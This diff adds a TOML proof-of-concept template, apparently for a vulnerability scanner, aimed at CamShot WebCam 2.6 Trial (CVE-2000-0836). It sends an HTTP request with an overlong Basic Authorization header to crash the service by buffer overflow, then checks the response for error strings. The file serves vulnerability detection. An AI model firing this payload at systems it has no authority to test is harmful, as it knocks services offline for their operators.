@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "向 CamShot WebCam 2.6 Trial 发送包含超长 Authorization 头部的 HTTP 请求，触发缓冲区溢出导致服务崩溃，验证漏洞存在性"
+id = "POC-AVE-2000-0622"
+name = "CamShot WebCam Trial 2.6 远程缓冲区溢出 PoC"
+severity = "high"
+tags = ["ave-2000-0622"]
+vuln_id = [
+    "CVE-2000-0836",
+    "AVE-2000-0622",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "Service Unavailable",
+    "500",
+]
